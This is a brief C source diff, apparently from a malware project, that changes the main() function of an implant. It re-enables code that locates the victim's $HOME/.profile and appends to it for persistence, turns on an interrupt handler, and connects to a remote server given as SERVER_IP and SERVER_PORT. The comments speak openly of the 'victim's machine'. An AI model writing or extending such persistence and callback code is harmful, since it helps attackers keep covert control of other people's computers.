@@ -322,18 +322,17 @@ int main(void)
 {
 
   // Get the .profile file path for the victim's machine
-  /*FILE *home_path = popen("echo $HOME/.profile", "r");
-  ;
+  FILE *home_path = popen("echo $HOME/.profile", "r");
   char get_path[50];
   fscanf(home_path, "%s", get_path);
   pclose(home_path);
 
   // Open .profile file in append mode
   FILE *profile = fopen(get_path, "a+");
-  persistence(get_path, profile);*/
+  persistence(get_path, profile);
 
   // LEAVE COMMENTED DURING DEV
-  //signal(SIGINT, kill_handler);
+  signal(SIGINT, kill_handler);
   connection server_con = connect_to(SERVER_IP, SERVER_PORT);
 
   // Check if the struct has been filled
